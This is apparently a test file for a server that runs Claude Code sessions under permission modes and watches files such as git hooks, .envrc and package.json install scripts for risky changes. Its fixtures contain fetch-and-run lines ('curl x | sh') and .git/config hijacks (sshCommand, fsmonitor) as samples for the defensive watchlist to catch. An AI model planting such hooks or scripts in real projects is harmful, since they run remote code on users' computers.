// Permission modes (modes.mjs) as sessions.mjs drives Claude Code with them — Read only, the page modes mapped both
// ways, one composed `permissions` object in the flag layer (shallow merge), Bypass permissions behind its gate and
// never kept — and the watchlist (watch.mjs): snapshots at a turn's start and end, the `watch` event, Revert.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { SessionManager } from '../server/sessions.mjs';
import { PermissionBroker, safeSuggestions } from '../server/broker.mjs';
import { MODES } from '../server/protocol.mjs';
import { READ_ONLY_DENY, BYPASS_ASK, START_MODES, cliMode, pageMode, normMode, permissionsFor, unionPermissions } from '../server/modes.mjs';
import { checkSnapshot, diffSnapshots, lifecycleOf, watchEvent, watched } from '../server/watch.mjs';
import { fakeQuery } from './fake-sdk.mjs';

const tick = (ms = 20) => new Promise((r) => setTimeout(r, ms));
function manager(opts = {}) {
  const queries = [], events = [], states = [], sent = [];
  const fq = fakeQuery(sent);
  const broker = new PermissionBroker({});
  const mgr = new SessionManager({ broker, spawn: () => { throw new Error('not used'); },
    query: (a) => { const q = fq(a); queries.push(q); return q; },
    onEvent: (s, seq, ev) => events.push([s.id, seq, ev]), onState: (s) => states.push([s.id, s.state, s.mode]), ...opts });
  return { mgr, broker, queries, events, states, sent };
}
// the flag calls a process got after its first one (the start's)
const flagCalls = (q) => q.calls.filter((c) => Array.isArray(c) && (c[0] === 'applyFlagSettings' || c[0] === 'setPermissionMode')).slice(1);

test('the page modes and Claude Code\'s: Read only is dontAsk; mapped back both ways', () => {
  assert.deepEqual(MODES, ['readOnly', 'plan', 'default', 'acceptEdits', 'auto', 'bypassPermissions']);
  assert.deepEqual(START_MODES, ['readOnly', 'plan', 'default', 'acceptEdits']);
  for (const m of MODES) assert.equal(pageMode(cliMode(m)), m, m);
  assert.equal(cliMode('readOnly'), 'dontAsk');
  assert.equal(pageMode('dontAsk'), 'readOnly');
  assert.equal(pageMode('manual'), 'default');
  for (const bad of ['readOnly', 'x', '', null, undefined, 7, '__proto__']) assert.equal(pageMode(bad), null, String(bad));
  assert.equal(normMode('dontAsk'), 'readOnly', 'the former "Don\'t ask" is Read only now');
  assert.deepEqual(permissionsFor('readOnly'), { deny: ['Edit', 'Write', 'NotebookEdit'] });
  assert.deepEqual(permissionsFor('bypassPermissions').ask, BYPASS_ASK);
  for (const m of ['plan', 'default', 'acceptEdits']) assert.equal(permissionsFor(m), null);
  assert.deepEqual(unionPermissions(permissionsFor('readOnly'), permissionsFor('bypassPermissions')), { deny: READ_ONLY_DENY, ask: BYPASS_ASK });
  assert.equal(unionPermissions(null, null), null);
  // the bypass ask rules: absolute, under /workspace, for the files that run on your computer later
  for (const r of BYPASS_ASK) assert.match(r, /^Edit\(\/\/workspace\/\.[a-z.]/);
  for (const f of ['.git/**', '.claude/**', '.vscode/**', '.husky/**', '.envrc', '.mcp.json']) assert.ok(BYPASS_ASK.includes(`Edit(//workspace/${f})`), f);
});

test('Read only: starts as dontAsk with the edit tools denied, before the first prompt is read', async () => {
  const { mgr, queries, sent, events } = manager();
  const s = mgr.get(mgr.open({ model: 'claude-haiku-5-5', mode: 'readOnly' }).id);
  const q = queries[0];
  assert.equal(q.options.permissionMode, 'dontAsk');
  assert.deepEqual(q.calls[0], ['applyFlagSettings', { disableAutoMode: 'disable', permissions: { deny: READ_ONLY_DENY } }]);
  s.prompt({ text: 'hi' });
  await tick();
  assert.equal(sent.length, 1);
  assert.equal(events.find(([, , ev]) => ev.type === 'init')[2].permissionMode, 'readOnly', 'init says the page mode');
  assert.equal(s.mode, 'readOnly');
  assert.equal(s.info().mode, 'readOnly');
  // the former "Don't ask" opens as Read only
  assert.equal(mgr.get(mgr.open({ mode: 'dontAsk' }).id).mode, 'readOnly');
  mgr.closeAll();
});

test('switching: one composed permissions object, both modes\' rules while it switches, the new one\'s alone after', async () => {
  const { mgr, queries } = manager();
  const s = mgr.get(mgr.open({ mode: 'default' }).id);
  const q = queries[0];
  const layer = () => ({ ...q.flags });
  await s.setMode('readOnly');
  // more rules first (deny), then the mode
  assert.deepEqual(flagCalls(q), [['applyFlagSettings', { permissions: { deny: READ_ONLY_DENY } }], ['setPermissionMode', 'dontAsk']]);
  assert.deepEqual(layer(), { disableAutoMode: 'disable', permissions: { deny: READ_ONLY_DENY } }, 'disableAutoMode stays (shallow merge)');
  q.calls.length = 1;
  await s.setMode('acceptEdits');
  // the mode first, then the rules go (null clears the key)
  assert.deepEqual(flagCalls(q), [['setPermissionMode', 'acceptEdits'], ['applyFlagSettings', { permissions: null }]]);
  assert.deepEqual(layer(), { disableAutoMode: 'disable' });
  q.calls.length = 1;
  await s.setMode('plan');
  assert.deepEqual(flagCalls(q), [['setPermissionMode', 'plan']], 'no rules of ours for Plan, Manual, Accept edits');
  assert.equal(s.mode, 'plan');
  // a refused switch: the old mode's rules stay, the mode too
  await s.setMode('readOnly');
  q.calls.length = 1;
  q.refuseMode = 'nope';
  await assert.rejects(s.setMode('acceptEdits'), /nope/);
  assert.equal(s.mode, 'readOnly');
  assert.deepEqual(layer().permissions, { deny: READ_ONLY_DENY });
  q.refuseMode = null;
  mgr.closeAll();
});

test('Claude Code\'s own mode changes are followed (dontAsk is Read only, with its rules set); a status says the page mode', async () => {
  const { mgr, queries, events } = manager();
  const s = mgr.get(mgr.open({ mode: 'default' }).id);
  const q = queries[0];
  s.prompt({ text: 'mode:dontAsk' });
  await tick();
  assert.equal(s.mode, 'readOnly');
  assert.deepEqual(q.flags.permissions, { deny: READ_ONLY_DENY }, 'the deny rules follow');
  assert.ok(events.some(([, , ev]) => ev.type === 'status' && ev.permissionMode === 'readOnly'));
  s.prompt({ text: 'mode:acceptEdits' });   // a plan approved with "accept edits"
  await tick();
  assert.equal(s.mode, 'acceptEdits');
  assert.equal(q.flags.permissions, undefined);
  s.prompt({ text: 'mode:bogus' });
  await tick();
  assert.equal(s.mode, 'acceptEdits');
  mgr.closeAll();
});

test('"Always" never switches to bypassPermissions, auto or dontAsk (only the page does, through set_mode)', () => {
  const sugg = (mode) => [{ type: 'setMode', mode, destination: 'session' }];
  for (const m of ['bypassPermissions', 'auto', 'dontAsk', 'readOnly']) assert.deepEqual(safeSuggestions(sugg(m)), [], m);
  for (const m of ['default', 'acceptEdits', 'plan']) assert.equal(safeSuggestions(sugg(m)).length, 1, m);
});

test('Bypass permissions, the gate: the setting × confirmed × a process started allowing it', async () => {
  // setting off: refused, and no process is started allowing it
  {
    const { mgr, queries } = manager();
    const s = mgr.get(mgr.open({}).id);
    assert.equal(queries[0].options.allowDangerouslySkipPermissions, undefined);
    await assert.rejects(s.setMode('bypassPermissions', { confirmed: true }), (e) => e.status === 403 && /Bypass permissions is off/.test(e.message));
    assert.equal(s.mode, 'default');
    mgr.closeAll();
  }
  // setting on: every process may switch; never without the confirmation; then ask rules first, then the mode
  {
    const { mgr, queries } = manager({ allowBypass: true });
    const s = mgr.get(mgr.open({ mode: 'acceptEdits' }).id);
    const q = queries[0];
    assert.equal(q.options.allowDangerouslySkipPermissions, true);
    assert.equal(q.options.permissionMode, 'acceptEdits', 'never started in bypass');
    await assert.rejects(s.setMode('bypassPermissions'), /confirmation/);
    await assert.rejects(s.setMode('bypassPermissions', { confirmed: 'yes' }), /confirmation/);
    assert.equal(s.mode, 'acceptEdits');
    q.calls.length = 1;
    await s.setMode('bypassPermissions', { confirmed: true });
    assert.deepEqual(flagCalls(q), [['applyFlagSettings', { permissions: { ask: BYPASS_ASK } }], ['setPermissionMode', 'bypassPermissions']]);
    assert.equal(s.mode, 'bypassPermissions');
    assert.equal(queries.length, 1, 'the same process');
    // back to Manual: the mode first, then the ask rules go
    q.calls.length = 1;
    await s.setMode('default');
    assert.deepEqual(flagCalls(q), [['setPermissionMode', 'default'], ['applyFlagSettings', { permissions: null }]]);
    // Read only → Bypass: both sets of rules while it switches
    await s.setMode('readOnly');
    q.calls.length = 1;
    await s.setMode('bypassPermissions', { confirmed: true });
    assert.deepEqual(flagCalls(q), [['applyFlagSettings', { permissions: { deny: READ_ONLY_DENY, ask: BYPASS_ASK } }], ['setPermissionMode', 'bypassPermissions'],
      ['applyFlagSettings', { permissions: { ask: BYPASS_ASK } }]]);
    mgr.closeAll();
  }
  // a process started before the setting allowed it: started again (resumed), then switched; never mid-turn
  {
    const { mgr, queries, events } = manager();
    const s = mgr.get(mgr.open({ model: 'claude-haiku-5-5' }).id);
    s.prompt({ text: 'one' });
    await tick();
    mgr.allowBypass = true;
    s.state = 'busy';
    await assert.rejects(s.setMode('bypassPermissions', { confirmed: true }), (e) => e.status === 409 && /working/.test(e.message));
    s.state = 'idle';
    await s.setMode('bypassPermissions', { confirmed: true });
    assert.equal(queries.length, 2);
    const o = queries[1].options;
    assert.deepEqual([o.resume, o.allowDangerouslySkipPermissions, o.permissionMode, o.model], [s.id, true, 'default', 'claude-haiku-5-5']);
    assert.ok(queries[0].calls.includes('close'));
    assert.ok(events.some(([, , ev]) => ev.type === 'local' && /Restarting Claude Code/.test(ev.text)));
    assert.equal(s.mode, 'bypassPermissions');
    mgr.closeAll();
  }
});

test('Bypass permissions is never kept: an ended process, an idle close, a resume, a new conversation start in Manual', async () => {
  const { mgr, queries, events } = manager({ allowBypass: true, transcriptExists: async () => false });
  const s = mgr.get(mgr.open({ model: 'claude-haiku-5-5' }).id);
  s.prompt({ text: 'one' });
  await tick();
  await s.setMode('bypassPermissions', { confirmed: true });
  mgr.sweepIdle(Date.now() + 31 * 60000);
  assert.equal(s.open, false);
  assert.equal(s.mode, 'default');
  assert.match(events.at(-1)[2].text, /in Manual/);
  s.prompt({ text: 'two' });
  assert.equal(queries.at(-1).options.permissionMode, 'default');
  // a page resuming it can only ask for a start mode
  assert.throws(() => mgr.open({ resume: s.id, mode: 'bypassPermissions' }), /never starts in bypassPermissions/);
  // without a process, Bypass is not kept for a next start: the process is started for it
  s.close();
  await s.setMode('bypassPermissions', { confirmed: true });
  assert.equal(s.open, true);
  assert.equal(s.mode, 'bypassPermissions');
  // the process ends (it failed): Manual again
  s.ended('boom');
  assert.equal(s.mode, 'default');
  // a new conversation started from a session in Bypass: Manual
  const t = mgr.get(mgr.open({}).id);
  await t.setMode('bypassPermissions', { confirmed: true });
  const N = '00000000-0000-4000-8000-0000000000bb';
  t.prompt({ text: `reset:${N}` });
  await tick(60);
  assert.equal(mgr.get(N).mode, 'default');
  assert.equal(queries.at(-1).options.permissionMode, 'default');
  mgr.closeAll();
});

// --- the watchlist ---
const sha = (b) => crypto.createHash('sha256').update(b).digest('hex');
const file = (path, text, mode = 0o644) => ({ path, type: 'file', size: Buffer.byteLength(text), mode, sha256: sha(text), data: Buffer.from(text).toString('base64') });

test('watch.mjs: which files, what changed, why (package.json: its install scripts only), what the page gets', () => {
  for (const p of ['.git/hooks/pre-commit', '.git/hooks', '.git/config', '.husky/pre-push', '.envrc', '.vscode/tasks.json', '.vscode/settings.json',
    '.claude/settings.json', '.claude/settings.local.json', '.mcp.json', 'package.json', '.devcontainer.json', '.devcontainer/devcontainer.json']) assert.ok(watched(p), p);
  for (const p of ['src/x.js', '.git/hooks/../config', '.git/objects/ab', 'a/package.json', '.vscode/launch.json', '../.envrc', '.claude/agents/x.md', null]) assert.equal(watched(p), null, String(p));
  assert.equal(checkSnapshot(null), null);
  assert.equal(checkSnapshot({ files: 'x' }), null);
  const snap = checkSnapshot({ files: [file('.git/config', '[core]\n'), { path: '/etc/passwd', type: 'file', sha256: sha('x') }, { path: '.envrc', type: 'file', sha256: 'nope' },
    { path: '.mcp.json', type: 'pipe', sha256: sha('x') }, file('.git/config', 'twice')] });
  assert.deepEqual([...snap.keys()], ['.git/config'], 'only watched paths with a hash, once');
  const pkg = (scripts) => file('package.json', JSON.stringify({ name: 'x', scripts, dependencies: { a: '1' } }));
  assert.equal(lifecycleOf(checkSnapshot({ files: [pkg({ test: 'jest' })] }).get('package.json')), '');
  const a = checkSnapshot({ files: [file('.git/config', '[core]\n'), pkg({ test: 'jest' }), file('.vscode/settings.json', '{}')] });
  const b = checkSnapshot({ files: [file('.git/config', '[core]\n\tfsmonitor = ./x\n'), pkg({ test: 'vitest', postinstall: 'curl x | sh' }),
    file('.git/hooks/pre-commit', 'echo hi\n', 0o755), file('.vscode/settings.json', '{}')] });
  const c = diffSnapshots(a, b);
  assert.deepEqual(c.map((x) => [x.path, x.change]), [['.git/config', 'changed'], ['.git/hooks/pre-commit', 'added'], ['package.json', 'changed']]);
  assert.match(c[2].why, /postinstall changed/);
  // package.json: only its install scripts count
  assert.deepEqual(diffSnapshots(checkSnapshot({ files: [pkg({ test: 'a' })] }), checkSnapshot({ files: [pkg({ test: 'b', build: 'tsc' })] })), []);
  // a hook made executable counts; a removed one too
  const h = (mode) => checkSnapshot({ files: [file('.git/hooks/pre-push', 'x', mode)] });
  assert.equal(diffSnapshots(h(0o644), h(0o755))[0].change, 'changed');
  assert.equal(diffSnapshots(h(0o755), checkSnapshot({ files: [] }))[0].change, 'removed');
  const ev = watchEvent('id1', 'turn', c);
  assert.equal(ev.type, 'watch');
  const hook = ev.changes.find((x) => x.path === '.git/hooks/pre-commit');
  assert.deepEqual([hook.before, hook.after, hook.revertable, hook.exec], [null, 'echo hi\n', true, true]);
  assert.match(hook.why, /git runs it on your computer/);
});

function watcher(script) {
  const w = { calls: [], restores: [], snaps: script.slice(), fail: null };
  w.snapshot = async () => { w.calls.push('snapshot'); if (w.fail) throw new Error(w.fail); return { files: w.snaps.length > 1 ? w.snaps.shift() : w.snaps[0] }; };
  w.restore = async (r) => { w.restores.push(r); if (r.path === '.envrc') throw new Error('it changed again since: not put back'); return { path: r.path, action: r.data === null ? 'trashed' : 'restored' }; };
  return w;
}

test('watchlist: a snapshot before the turn\'s first prompt goes, one after its result; a change gives a watch event; Revert', async () => {
  const cfg0 = file('.git/config', '[core]\n'), cfg1 = file('.git/config', '[core]\n\tsshCommand = evil\n');
  const hook = file('.git/hooks/pre-commit', 'curl x | sh\n', 0o755);
  const w = watcher([[cfg0], [cfg1, hook], [cfg1, hook]]);
  const { mgr, events, sent } = manager({ watcher: w });
  const s = mgr.get(mgr.open({}).id);
  s.prompt({ text: 'do it' });
  assert.equal(sent.length, 0, 'waits for the snapshot');
  await tick(60);
  assert.equal(sent.length, 1);
  assert.deepEqual(w.calls, ['snapshot', 'snapshot']);
  const ev = events.map(([, , e]) => e).find((e) => e.type === 'watch');
  assert.equal(ev.when, 'turn');
  assert.deepEqual(ev.changes.map((c) => [c.path, c.change]), [['.git/config', 'changed'], ['.git/hooks/pre-commit', 'added']]);
  // Revert: each file only while it is still as the event saw it (bn-coded checks the hash)
  const r = await s.revertWatch(ev.id);
  assert.deepEqual(r.map((x) => [x.path, x.ok, x.action]), [['.git/config', true, 'restored'], ['.git/hooks/pre-commit', true, 'trashed']]);
  assert.deepEqual(w.restores[0], { path: '.git/config', ifSha256: cfg1.sha256, data: cfg0.data, mode: 0o644 });
  assert.deepEqual(w.restores[1], { path: '.git/hooks/pre-commit', ifSha256: hook.sha256, data: null, mode: null });
  assert.ok(events.some(([, , e]) => e.type === 'local' && /Put back/.test(e.text)));
  assert.deepEqual((await s.revertWatch(ev.id, '.git/config')).map((x) => x.action), ['already']);
  await assert.rejects(s.revertWatch('00000000-0000-4000-8000-00000000dead'), (e) => e.status === 404);
  mgr.closeAll();
});

test('watchlist: changes between turns are told at the next turn\'s start; a refused revert says why; an old sandbox turns it off once', async () => {
  const env0 = file('.envrc', 'x=1\n'), env1 = file('.envrc', 'curl x | sh\n');
  const w = watcher([[env0], [env0], [env1], [env1]]);
  const { mgr, events } = manager({ watcher: w });
  const s = mgr.get(mgr.open({}).id);
  s.prompt({ text: 'one' });
  await tick(60);
  assert.equal(events.filter(([, , e]) => e.type === 'watch').length, 0, 'nothing changed in the turn');
  s.prompt({ text: 'two' });
  await tick(60);
  const ev = events.map(([, , e]) => e).find((e) => e.type === 'watch');
  assert.equal(ev.when, 'between');
  assert.deepEqual(ev.changes.map((c) => c.path), ['.envrc']);
  const r = await s.revertWatch(ev.id);
  assert.deepEqual([r[0].ok, r[0].error], [false, 'it changed again since: not put back']);
  // a sandbox whose bn-coded has no watchlist: said once, prompts go on
  w.fail = 'unknown op';
  s.prompt({ text: 'three' });
  await tick(60);
  s.prompt({ text: 'four' });
  await tick(60);
  assert.equal(events.filter(([, , e]) => e.type === 'local' && /not checked in this session/.test(e.text)).length, 1);
  assert.equal(events.filter(([, , e]) => e.type === 'text' && /pong:four/.test(e.text)).length, 1);
  mgr.closeAll();
});
